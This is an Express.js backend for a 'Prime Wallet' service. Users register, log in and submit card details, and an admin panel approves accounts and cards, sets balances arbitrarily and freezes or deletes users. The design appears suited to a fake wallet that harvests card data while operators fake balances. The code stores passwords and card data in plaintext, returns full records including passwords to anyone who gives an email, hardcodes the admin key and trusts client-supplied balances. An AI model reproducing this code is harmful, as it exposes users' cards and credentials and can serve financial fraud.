const express = require("express");
const cors = require("cors");
const bodyParser = require("body-parser");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: "50mb" }));
app.use(bodyParser.urlencoded({ extended: true, limit: "50mb" }));

// ==============================================
// 💾 DATA STORAGE — Saves Forever!
// ==============================================
const DATA_FILE = path.join(__dirname, "users-data.json");

// Load existing data
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
    }
  } catch (e) { console.log("⚠️ No existing data"); }
  return { users: [] };
}

// Save data
function saveData(data) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// ==============================================
// 🔐 ADMIN AUTH
// ==============================================
const ADMIN_KEY = "admin_primewallet_2026";

function checkAdmin(req, res, next) {
  const auth = req.headers.authorization;
  if (!auth || auth !== `Bearer ${ADMIN_KEY}`) {
    return res.status(403).json({ error: "Unauthorized" });
  }
  next();
}

// ==============================================
// 👤 USER ENDPOINTS
// ==============================================

// REGISTER — User sends data here
app.post("/api/auth/register", (req, res) => {
  const data = loadData();
  const user = req.body;
  
  // Check if email exists
  if (data.users.find(u => u.email === user.email)) {
    return res.status(400).json({ error: "Email already registered" });
  }

  // Add new user
  user.id = "user_" + Date.now();
  user.balance = user.balance || 0;
  user.approved = false;
  user.card_approved = false;
  user.frozen = false;
  user.registered_at = new Date().toISOString();
  
  data.users.push(user);
  saveData(data);
  
  res.json({ success: true, user });
  console.log(`✅ NEW USER: ${user.full_name} (${user.country})`);
});

// LOGIN
app.post("/api/auth/login", (req, res) => {
  const data = loadData();
  const { email, password } = req.body;
  const user = data.users.find(u => u.email === email && u.password === password);
  
  if (!user) return res.status(401).json({ error: "Invalid credentials" });
  
  res.json({ 
    token: "user_token_" + user.id,
    user: { ...user, password: undefined }
  });
});

// SUBMIT CARD
app.post("/api/user/submit-card", (req, res) => {
  const data = loadData();
  const { email, cardData } = req.body;
  const idx = data.users.findIndex(u => u.email === email);
  
  if (idx === -1) return res.status(404).json({ error: "User not found" });
  
  data.users[idx] = { ...data.users[idx], ...cardData, card_submitted: true };
  saveData(data);
  res.json({ success: true });
});

// GET USER DATA
app.post("/api/user/get", (req, res) => {
  const data = loadData();
  const { email } = req.body;
  const user = data.users.find(u => u.email === email);
  if (!user) return res.status(404).json({ error: "Not found" });
  res.json(user);
});

// ==============================================
// 🏛️ ADMIN ENDPOINTS
// ==============================================

// GET ALL USERS
app.get("/api/admin/users", checkAdmin, (req, res) => {
  const data = loadData();
  res.json(data.users);
});

// APPROVE ACCOUNT
app.post("/api/admin/approve-account", checkAdmin, (req, res) => {
  const data = loadData();
  const user = data.users.find(u => u.id === req.body.userId);
  if (!user) return res.status(404).json({ error: "Not found" });
  user.approved = true;
  saveData(data);
  res.json({ success: true });
});

// APPROVE CARD
app.post("/api/admin/approve-card", checkAdmin, (req, res) => {
  const data = loadData();
  const user = data.users.find(u => u.id === req.body.userId);
  if (!user) return res.status(404).json({ error: "Not found" });
  user.card_approved = true;
  saveData(data);
  res.json({ success: true });
});

// UPDATE BALANCE
app.post("/api/admin/update-balance", checkAdmin, (req, res) => {
  const data = loadData();
  const user = data.users.find(u => u.id === req.body.userId);
  if (!user) return res.status(404).json({ error: "Not found" });
  user.balance = req.body.balance;
  saveData(data);
  res.json({ success: true });
});

// TOGGLE FREEZE
app.post("/api/admin/toggle-freeze", checkAdmin, (req, res) => {
  const data = loadData();
  const user = data.users.find(u => u.id === req.body.userId);
  if (!user) return res.status(404).json({ error: "Not found" });
  user.frozen = !user.frozen;
  saveData(data);
  res.json({ success: true, frozen: user.frozen });
});

// DELETE USER
app.post("/api/admin/delete-user", checkAdmin, (req, res) => {
  let data = loadData();
  data.users = data.users.filter(u => u.id !== req.body.userId);
  saveData(data);
  res.json({ success: true });
});

// ==============================================
// ✅ SERVER START
// ==============================================
app.listen(PORT, () => {
  console.log(`🚀 Prime Wallet API running on port ${PORT}`);
  console.log(`📊 Total Users: ${loadData().users.length}`);
});
